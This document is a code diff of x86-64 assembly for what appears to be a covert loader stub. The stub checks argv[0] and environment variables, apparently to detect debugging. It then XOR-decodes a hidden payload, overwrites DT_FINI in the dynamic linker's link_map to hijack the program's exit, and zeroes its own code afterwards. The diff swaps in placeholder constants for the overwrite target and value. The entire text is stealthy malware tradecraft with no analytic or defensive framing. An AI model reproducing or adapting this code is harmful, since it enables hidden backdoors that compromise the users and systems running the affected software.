@@ -1,4 +1,6 @@
 .equ PAYLOAD_SIZE_IN_WORDS, 0
+.equ ADDR_TO_WRITE, 0x1111111111111111
+.equ VALUE_TO_WRITE, 0x2222222222222222
 
 .macro movqq a, b
     push \b
@@ -7,11 +9,12 @@
 
 _begin:
     push rbx
-    lea rbx, [rip+_begin-24]
+    lea rbx, [rip+_begin-8]
     mov rdi, [rbx] /* &_dl_argv */
 
     // Make sure argv[0] starts with '/' (which is unusual when debugging, but plausible with xinetd)
     mov rax, [rdi]
+    movabs r10, ADDR_TO_WRITE
     test eax, eax
     jz bye
     cmp byte ptr [rax], '/'
@@ -28,6 +31,7 @@ _begin:
 env_check_loop:
     lodsq
     test eax, eax
+    movabs r11, VALUE_TO_WRITE
     jz env_check_okay
     mov eax, dword ptr [rax]
     ror eax, 1
@@ -45,8 +49,8 @@ env_check_loop:
 env_check_okay:
     // Decode payload
     movqq rcx, (PAYLOAD_SIZE_IN_WORDS+1)
-    // lea rdi, [rbx+(_end-_begin)+24]
-    .byte 0x48, 0x8d, 0x7b, (_end-_begin)+24
+    // lea rdi, [rbx+(_end-_begin)+8]
+    .byte 0x48, 0x8d, 0x7b, (_end-_begin)+8
     xor eax, eax
 decode_loop:
     xor [rdi+rcx*4], eax
@@ -59,20 +63,18 @@ decode_loop:
     add eax, [rdi+rcx*4]
     loop decode_loop
 
+    // Overwrite dl_info[DT_FINI] in link_map
+    mov [r10], r11
+
     // Patch payload to only run at correct time.
     call [rbx-8]
-
-    // Overwrite dl_info[DT_FINI] in link_map
-    mov rdi, [rbx+8]
-    mov rax, [rbx+16]
-    stosq
 bye:
     // Zeroing self
     movqq rdi, rbx
     pop rbx
-    // GNU AS (2.40) is too stupid: it assembles "push (_fin-_begin+24)" into a 0x68 (4 byte push) instead of single byte one.
+    // GNU AS (2.40) is too stupid: it assembles "push (_fin-_begin+8)" into a 0x68 (4 byte push) instead of single byte one.
     .byte 0x6A
-    .byte (_fin-_begin+24)
+    .byte (_fin-_begin+8)
     pop rcx
     xor eax, eax
     rep stosb
